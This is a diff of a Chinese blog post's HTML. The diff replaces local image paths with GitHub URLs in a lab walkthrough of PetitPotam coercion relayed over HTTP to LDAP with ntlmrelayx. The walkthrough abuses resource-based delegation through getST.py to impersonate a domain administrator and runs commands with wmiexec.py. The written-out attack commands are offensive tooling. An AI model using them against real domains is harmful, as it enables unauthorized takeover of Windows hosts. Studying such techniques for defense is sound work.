@@ -359,7 +359,7 @@
 <p>当微软修复CVE-2019-1040的时候，顺便修了smb中继到ldap。</p>
 <p>但是我们还能通过http中继到ldap，但前提条件是目标打开Webclient服务，server默认不安装，win7，win10默认安装但是需要手动打开服务。</p>
 </blockquote>
-<p><img src="C:%5CUsers%5Cscareing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220116171241499.png" alt="image-20220116171241499"></p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2022/01/13/PetitPotam%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E7%9A%84%E6%A8%AA%E5%90%91%E6%8A%80%E5%B7%A7/1.png" alt="avatar"></p>
 <p>条件：</p>
 <ul>
 <li>域账户一个</li>
@@ -377,16 +377,16 @@
 
 <h3 id="2-用已知域普通用户，添加DNS解析"><a href="#2-用已知域普通用户，添加DNS解析" class="headerlink" title="2.用已知域普通用户，添加DNS解析"></a>2.用已知域普通用户，添加DNS解析</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DNSUpdate</span> <span class="selector-tag">-DNSName</span> <span class="selector-tag">ubuntu</span> <span class="selector-tag">-DNSData</span> 192<span class="selector-class">.168</span><span class="selector-class">.60</span><span class="selector-class">.130</span></span><br><span class="line"></span><br><span class="line">这里是因为没找到远程添加<span class="selector-tag">dns</span>的工具，直接上域机器加了<span class="selector-tag">DNS</span>记录。</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cscareing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220113171543297.png" alt="image-20220113171543297"></p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2022/01/13/PetitPotam%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E7%9A%84%E6%A8%AA%E5%90%91%E6%8A%80%E5%B7%A7/2.png" alt="avatar"></p>
 <h3 id="3-使用PetitPotam中继http请求"><a href="#3-使用PetitPotam中继http请求" class="headerlink" title="3.使用PetitPotam中继http请求"></a>3.使用PetitPotam中继http请求</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam<span class="selector-class">.py</span> -d sec<span class="selector-class">.local</span> -u nortest -<span class="selector-tag">p</span> p@ssw0rd ubuntu@<span class="number">80</span>/ubuntu<span class="selector-class">.sec</span><span class="selector-class">.local</span> <span class="number">192.168</span>.<span class="number">60.133</span></span><br><span class="line"></span><br><span class="line">sudo ntlmrelayx<span class="selector-class">.py</span> -t ldap:<span class="comment">//192.168.60.128 --delegate-access --escalate-user rbcd$   --no-dump -smb2support</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cscareing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220113171703723.png" alt="image-20220113171703723"></p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2022/01/13/PetitPotam%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E7%9A%84%E6%A8%AA%E5%90%91%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
 <h3 id="4-使用资源委派拿目标主机的票据"><a href="#4-使用资源委派拿目标主机的票据" class="headerlink" title="4.使用资源委派拿目标主机的票据"></a>4.使用资源委派拿目标主机的票据</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST<span class="selector-class">.py</span> sec.local/rbcd$:Password123 -dc-ip <span class="number">192.168</span>.<span class="number">60.128</span> -spn cifs/WIN7<span class="selector-class">.sec</span><span class="selector-class">.local</span> -impersonate administrator</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cscareing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220113171820442.png" alt="image-20220113171820442"></p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2022/01/13/PetitPotam%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E7%9A%84%E6%A8%AA%E5%90%91%E6%8A%80%E5%B7%A7/4.png" alt="avatar"></p>
 <h3 id="5-导入票据并使用wmiexec执行命令，获取权限"><a href="#5-导入票据并使用wmiexec执行命令，获取权限" class="headerlink" title="5.导入票据并使用wmiexec执行命令，获取权限"></a>5.导入票据并使用wmiexec执行命令，获取权限</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec<span class="selector-class">.py</span> -dc-ip <span class="number">192.168</span>.<span class="number">60.128</span> -k -no-pass WIN7<span class="selector-class">.sec</span><span class="selector-class">.local</span>  whoami</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cscareing%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220113172119288.png" alt="image-20220113172119288"></p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2022/01/13/PetitPotam%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E7%9A%84%E6%A8%AA%E5%90%91%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></p>
 <p>[^本来以为是域内非server机器乱杀，结果有前提条件，略显鸡肋。]: </p>
 
           
